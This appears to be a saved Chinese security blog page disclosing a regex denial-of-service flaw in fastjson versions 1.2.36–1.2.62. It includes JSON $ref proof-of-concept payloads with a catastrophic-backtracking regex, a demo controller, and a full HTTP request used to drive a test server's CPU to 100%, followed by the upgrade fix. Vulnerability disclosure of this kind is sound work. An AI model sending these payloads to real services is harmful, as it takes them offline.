@@ -1,0 +1,394 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>fastjson &lt; 1.2.66 正则表达式拒绝服务漏洞 - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="关于漏洞朋友说最近fastjson又出新洞了，我就再研究了一遍fastjson，结果又找出来了一个拒绝服务漏洞，所以有了这篇文章。目前该漏洞已在最新版本被修复，使用版本&amp;lt;=1.2.62的建..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="fastjson &lt; 1.2.66 正则表达式拒绝服务漏洞 &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/314.html" />
+<link rel="alternate" type="application/rdf+xml" title="fastjson &lt; 1.2.66 正则表达式拒绝服务漏洞 &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/314.html" />
+<link rel="alternate" type="application/atom+xml" title="fastjson &lt; 1.2.66 正则表达式拒绝服务漏洞 &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/314.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-300'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-300'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-300'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _p5Jk = //'5'
+'828'+'981'//'G'
++'ad2'//'CM'
++'2'//'Xj'
++'A'//'A'
++'3'//'aSZ'
++'6c'//'4T'
++//'Lg'
+'79'+//'ej'
+'3c'+'e'//'SF'
++//'C5k'
+'833'+'22'//'D'
++'e'//'a'
++'5e3'//'Xz'
++//'M'
+'84c'+//'CBw'
+'CBw'+//'R03'
+'3'+//'ce'
+'5', _xJHrL = [[10,11],[30,33]];
+    
+    for (var i = 0; i < _xJHrL.length; i ++) {
+        _p5Jk = _p5Jk.substring(0, _xJHrL[i][0]) + _p5Jk.substring(_xJHrL[i][1]);
+    }
+
+    return _p5Jk;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">fastjson &lt; 1.2.66 正则表达式拒绝服务漏洞</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2020-03-24 19:33:00" itemprop="datePublished">2020-03-24 19:33:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/314.html"><a href="https://b1ue.cn/category/vul/">漏洞</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/314.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <h1>关于漏洞</h1><p>朋友说最近fastjson又出新洞了，我就再研究了一遍fastjson，结果又找出来了一个拒绝服务漏洞，所以有了这篇文章。目前该漏洞已在最新版本被修复，使用版本&lt;=1.2.62的建议更新到&gt;=1.2.66版本。</p><table><tbody><tr><td>漏洞类型</td><td>拒绝服务</td></tr><tr><td>漏洞等级</td><td>高危</td></tr><tr><td>影响范围</td><td>1.2.36 - 1.2.62</td></tr></tbody></table><h1>漏洞分析</h1><p>首先导入1.2.62版本的fastjson</p><pre><code>        &lt;dependency&gt;
+            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
+            &lt;version&gt;1.2.62&lt;/version&gt;
+        &lt;/dependency&gt;</code></pre><h2>JSONPath</h2><p>我最开始是从 JSONPath 这个类看起的，漏洞主要也出现在 JSONPath 类。</p><p>JSONPath 是一个用于通过表达式快速的获取 JSON 对象里的数据的类。</p><p>有点类似于 Xpath、CSS选择器这种东西。</p><p>举个例子</p><pre><code>Object result = new JSONPath(&quot;$.root['item1']&quot;).eval(&quot;{\&quot;root\&quot;:{\&quot;item1\&quot;:\&quot;blue\&quot;}}&quot;);
+//Object result = JSONPath.eval(&quot;{\&quot;root\&quot;:{\&quot;item1\&quot;:\&quot;blue\&quot;}}&quot;, &quot;$.root['item1']&quot;);
+/**
+result = blue
+**/</code></pre><p><code>JSONPath#JSONPath(java.lang.String)</code> 构造方法会将传进来的 path 赋给 this.path 属性。</p><p><img src="/usr/uploads/2020/03/3232329439.jpg" alt="1585051728(1).jpg" title="1585051728(1).jpg"></p><p>跟进到 init 方法</p><p><img src="/usr/uploads/2020/03/1500796360.jpg" alt="1585051891(1).jpg" title="1585051891(1).jpg"></p><p>跟进 <code>JSONPath.JSONPathParser#explain</code> </p><p><img src="/usr/uploads/2020/03/4129671662.jpg" alt="1585052097(1).jpg" title="1585052097(1).jpg"></p><p>跟进 <code>JSONPath.JSONPathParser#readSegement</code></p><p><img src="/usr/uploads/2020/03/489141278.jpg" alt="1585052161(1).jpg" title="1585052161(1).jpg"></p><p>这里当前读到的字符等于<code>[</code>就进入到<code>JSONPath.JSONPathParser#parseArrayAccess</code></p><pre><code>    JSONPath.Segment parseArrayAccess(boolean acceptBracket) {
+        Object object = this.parseArrayAccessFilter(acceptBracket);
+        return (JSONPath.Segment)(object instanceof JSONPath.Segment ? (JSONPath.Segment)object : new JSONPath.FilterSegment((JSONPath.Filter)object));
+    }
+</code></pre><p>parseArrayAccess 先调用<code>parseArrayAccessFilter()</code>方法得到一个Segment对象，然后将它再实例化为FilterSegment对象。</p><p><code>JSONPath</code>第3117行处当读取到的操作符为 RLIKE 或 NOT_RLIKE 时就会返回一个 JSONPath.RlikeSegement 对象</p><p><img src="/usr/uploads/2020/03/4014985977.jpg" alt="1585053407(1).jpg" title="1585053407(1).jpg"></p><p>propertyName 是操作符左边的值，name是操作符右边的值。</p><p>比如 <code>[var rlike 'regex']</code> propertyName=var , name=regex</p><p><img src="/usr/uploads/2020/03/1541716569.jpg" alt="1585054002(1).jpg" title="1585054002(1).jpg"></p><p>返回到 <code>init()</code>方法<code>this.segments</code>最终得到了一个内嵌RlikeSegement对象的FilterSegment数组。</p><p>再跳回到最开始的 eval 方法，</p><p>当初始化完成后开始对 segments 数组遍历，调用它们的<code>eval(this, rootObject, currentObject)</code>方法</p><p>前面提到过，数组里有一个<code>FilterSegment</code>对象，所以应该跟进到<code>FilterSegment#eval</code>方法。</p><p><img src="/usr/uploads/2020/03/553547805.jpg" alt="1585055092(1).jpg" title="1585055092(1).jpg"></p><p>filter 是 RlikeSegement 对象，所以应跟到 <code>JSONPath.RlikeSegement#apply</code>。</p><p>后面就是从 currentObject 中取 propertyName 然后和正则匹配。</p><p>漏洞就出现在这个地方，当正则表达式可控时，就会造成“REDOS”正则表达式拒绝服务。</p><pre><code>Object eval = new JSONPath(&quot;[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']&quot;).eval(&quot;{\&quot;blue\&quot;:\&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\&quot;}&quot;);</code></pre><p>执行这一段代码你会发现在正则匹配的时候线程就阻塞在那儿不动了，并且还会耗费 CPU。</p><p>这样虽然可以让 Java 应用拒绝服务，但在大多数项目中很少能见到 JSONPath 可控的场景。</p><p>所以应该找到在解析 JSON 时的利用点。</p><h2>JSON $ref</h2><p>先来看常见的解析 json 对象用的静态方法 <code>JSON.parse</code></p><p><img src="/usr/uploads/2020/03/1327826304.jpg" alt="1585056411(1).jpg" title="1585056411(1).jpg"></p><p>这里先用 DefaultJSONParser 类对整个 json 字符串进行了 JSON 对象的转化。</p><p>跳过一些无用步骤，直接到<code>DefaultJSONParser#parseObject</code>。</p><p>首先要让key等于<code>$ref</code>满足if条件。</p><p><img src="/usr/uploads/2020/03/9953445.jpg" alt="1585057350(1).jpg" title="1585057350(1).jpg"></p><p>然后让 $ref 的值不要等于 @ 和 .. 和 $ 就会进入 else 代码块调用 addResolveTask 方法，这个方法的作用就是给<code>this.resolveTaskList</code>集合添加一个ResolveTask对象。</p><p><img src="/usr/uploads/2020/03/4161060821.jpg" alt="1585057417(1).jpg" title="1585057417(1).jpg"></p><p>再返回到 <code>JSON#parse</code>，JSON解析部分结束</p><p>进入漏洞触发点<code>DefaultJSONParser#handleResovleTask</code>方法。</p><p><img src="/usr/uploads/2020/03/1322186070.jpg" alt="1585058455(1).jpg" title="1585058455(1).jpg"></p><p>最终在 1508 行调用了 <code>JSONPath.eval(value, ref);</code> 触发漏洞。</p><p>我构造得到如下 POC 代码</p><pre><code>{
+    &quot;regex&quot;:{
+        &quot;$ref&quot;:&quot;$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']&quot;
+    },
+    &quot;blue&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;
+}</code></pre><p>另外除了<strong>RlikeSegement</strong>类以外还有一个<strong>RegMatchSegement</strong>类，同样存在REDOS漏洞，过程基本上一样所以直接放上POC。</p><pre><code>{
+    &quot;regex&quot;:{
+        &quot;$ref&quot;:&quot;$[\blue = /\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]&quot;
+    },
+    &quot;blue&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;
+}</code></pre><h1>漏洞演示</h1><p>我写了一个简单的 demo 用来测试是否能够将 java 应用拒绝服务。</p><p><img src="/usr/uploads/2020/03/363143691.jpg" alt="1585058816(1).jpg" title="1585058816(1).jpg"></p><pre><code>/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="61030d14042108191204024f0e1306">[email&#160;protected]</a>
+ * @since 2019/11/17 21:16
+ */
+@RestController
+@RequestMapping()
+public class TestController {
+
+    @RequestMapping(&quot;/parse&quot;)
+    public String parse(String json){
+        Object parse = JSON.parse(json);
+        return parse.toString();
+    }
+}</code></pre><p>启动服务后我开启了 50 个线程同时向解析json的接口发起请求</p><pre><code>POST /parse HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 126
+
+json={&quot;regex&quot;%3a{&quot;$ref&quot;%3a&quot;$[blue+rlike+'^[a-zA-Z]%2b(([a-zA-Z+])%3f[a-zA-Z]*)*$']&quot;},&quot;blue&quot;%3a&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;}</code></pre><p><img src="/usr/uploads/2020/03/2386752872.jpg" alt="1585059312(1).jpg" title="1585059312(1).jpg"></p><p>CPU 瞬间飙升 100%</p><h1>修复方案</h1><ul><li>更新版本大于等于 1.2.66</li></ul>        </div>
+    </article>
+
+    <div id="comments">
+            <h3 class="responses-title">Comments : 2 </h3>
+    
+    <ol class="comment-list">    <li class="comment">
+			<div id="comment-10" class="comment-block">
+					<div class="comment-info u-clearfix">
+						<div class="comment-avatar">
+                                                        <img class="avatar" src="https://secure.gravatar.com/avatar/bebdf8637949303457ebf5a56a95746e?s=32&r=G&d=" alt="a" width="32" height="32" />
+							
+						</div>
+						<div class="comment-meta">
+							<div class="comment-author">a									<span class="comment-reply-link u-cursorPointer" ><a href="https://b1ue.cn/archives/314.html?replyTo=10#respond-post-300" rel="nofollow" onclick="return TypechoComment.reply('comment-10', 10);">回复</a></span>
+							</div>
+							<div class="comment-time" itemprop="datePublished">
+                                <time class="lately-b" datetime="2020-04-13 18:14:17" itemprop="datePublished">2020-04-13 18:14:17</time>
+							</div>
+						</div>
+					</div>
+					<div class="comment-content">
+						<p>Object eval = new JSONPath("[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']").eval(JSONObject.parseObject("{\"blue\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\",}"));</p><p>eval的参数好像必须转换才行a</p>					</div>
+			</div>
+                            <ol class="children">
+                    <ol class="comment-list">    <li class="comment">
+			<div id="comment-11" class="comment-block">
+					<div class="comment-info u-clearfix">
+						<div class="comment-avatar">
+                                                        <img class="avatar" src="https://secure.gravatar.com/avatar/8fcb945d487c486ab52a524b3d5792ae?s=32&r=G&d=" alt="浅蓝" width="32" height="32" />
+							
+						</div>
+						<div class="comment-meta">
+							<div class="comment-author"><a href="https://b1ue.cn/" rel="external nofollow">浅蓝</a>									<span class="comment-reply-link u-cursorPointer" ><a href="https://b1ue.cn/archives/314.html?replyTo=11#respond-post-300" rel="nofollow" onclick="return TypechoComment.reply('comment-11', 11);">回复</a></span>
+							</div>
+							<div class="comment-time" itemprop="datePublished">
+                                <time class="lately-b" datetime="2020-04-14 18:14:13" itemprop="datePublished">2020-04-14 18:14:13</time>
+							</div>
+						</div>
+					</div>
+					<div class="comment-content">
+						<p>不用，string类型的json在com.alibaba.fastjson.JSONPath#getPropertyValue方法里会自动转成jsonobject</p>					</div>
+			</div>
+                </li>
+    </ol>                </ol>
+                </li>
+    </ol>
+	<div class="lists-navigator clearfix">
+    	</div>
+    
+    
+        <div id="respond-post-300" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/314.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/314.html#respond-post-300" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
